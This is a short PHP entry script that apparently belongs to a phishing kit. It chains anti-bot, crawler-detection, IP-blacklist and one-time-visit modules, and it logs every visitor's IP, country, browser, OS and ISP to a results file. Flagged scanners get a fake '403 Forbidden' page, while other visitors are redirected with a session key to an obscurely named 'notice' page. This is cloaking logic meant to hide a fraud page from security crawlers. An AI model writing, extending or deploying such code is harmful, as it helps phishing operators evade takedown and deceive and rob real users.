<?php
session_start();
require 'main.php';
require_once 'blocker.php';
if($block_referrer == "on") {
    require_once 'crawlerdetect.php';
}
if(filesize("antibot.ini") == 1) {
} else{
require_once("antibot.php");
}
if($block_iprange == "on") {
    require_once 'blacklist.php';
}
if($onetime == "on") {
    require_once 'onetime.php';
}
tulis_file("result/total_click.txt","$ip|$countrycode|$countryname|$br|$os|$ispuser");

if ($hide_page == "on") {
    tulis_file("result/total_bot.txt","$ip|request to hidden page");
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><div class="lds-spinner"><h1>Loading ...</h1><div></body></html>');
} else {
    $_SESSION['key'] = $key;
    header("location: irfof-wmsp/notice?key=$key");
}

?>